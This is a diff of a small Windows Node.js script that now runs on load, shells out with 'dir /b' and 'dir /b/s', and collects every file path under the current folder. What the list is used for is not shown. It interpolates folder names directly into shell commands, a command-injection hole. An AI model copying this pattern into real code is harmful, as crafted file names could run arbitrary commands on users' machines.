@@ -18,19 +18,18 @@ async function ip4(){
     return bool
     
 }
-let c=0
-async function run(){
+(async function(){
     const {stdout} = await exe(`dir /b`)
-    let arr        = stdout.split('\n').filter(n=>n)
+    let files      = stdout.split('\n').filter(n=>n)
     let out=''
-    for(i=0;i<arr.length;i++){
-        if(arr[i].split('.').length==1){
-            let {stdout} = await exe(`cd ${arr[i]} && dir /b/s`)
+    for(i=0;i<files.length;i++){
+        if(files[i].split('.').length==1){
+            let {stdout} = await exe(`cd ${files[i]} && dir /b/s`)
             out+=stdout.split('\n').filter(n=>n).join('\n')
             await exe('cd ..')
         }
         else{
-            out+='\n'+arr[i]+'\n'
+            out+='\n'+files[i]+'\n'
         }
     }
     out=out.split('\n').filter(n=>n)
@@ -57,6 +56,4 @@ async function run(){
     })
     
 
-}
-
-run()
+})()
